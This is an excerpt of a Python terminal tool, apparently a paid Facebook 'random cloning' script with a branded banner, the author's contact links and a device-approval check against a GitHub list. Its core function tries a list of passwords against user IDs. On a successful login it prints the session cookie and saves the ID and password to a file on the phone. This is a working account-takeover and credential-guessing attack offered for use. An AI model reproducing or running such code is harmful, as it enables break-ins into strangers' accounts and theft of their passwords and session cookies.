...
\033[38;5;46m┌━━━━━━━━━━━━━━━━━━\033[33;1m⊱   ⊰\033[38;5;46m━━━━━━━━━━━━━━━━━━┐\033[33;1m ┫│\033[38;5;46m★\033[33;1m│┣
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘈𝘜𝘛𝘏𝘖𝘙      \033[1;97m  :  \033[34;1mRASEL-KING \033[38;5;46m│ \033[33;1m┫│\033[38;5;46m★\033[33;1m│┣
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘎𝘐𝘛𝘏𝘜𝘉        \033[1;97m:  \033[34;1m Rasel-king   \033[38;5;46m   │  \033[33;1m┗━┛
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘞𝘏𝘈𝘛𝘚𝘈𝘗𝘗   \033[1;97m   :  \033[34;1m01602331251      \033[38;5;46m│
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘗𝘖𝘞𝘌𝘙       \033[1;97m  :  \033[34;1mTHE KING MAKER RASEL VAU          \033[38;5;46m│
...
def Main():
	os.system('clear')
	print(logo)
	print("[\033[1;37m01\33[1;92m][\033[1;93m[ A ]\33[1;92m] START RANDOM CLONING")
	print("[\033[1;37m02\33[1;92m][\033[1;93m[ B ]\33[1;92m] CONTACT ADMIN & FB GROUP")
	print("[\033[1;37m03\33[1;92m][\033[1;93m[ C ]\33[1;92m] FOLLOW MY FB PROFILE")
	print("[\033[1;37m04\33[1;92m][\033[1;93m[ D ]\33[1;92m] JOIN MESSENGER GROUP")
	print('[\033[1;37m00\33[1;92m][\033[1;93m[ E ]\33[1;92m] EXIT PROGRAMMING')
	print(54*'━')
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/rasel1861?mibextid=ZbWKwL');time.sleep(1)
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://wa.me/+8801602331251');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mRASEL-👿\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [RASEL-OK🔥] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[🍪]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/Rasel-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/NX-CYBAR/R4NDOM/blob/main/Approval.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        ...
        print ("\n")
        os.system("espeak \"assalamualaikum ,I am BD  ROBOT and my boss is THE KING MAKER OMI & DARK DEVIL Sir this tool is paid because 100% ok id just now login\"")
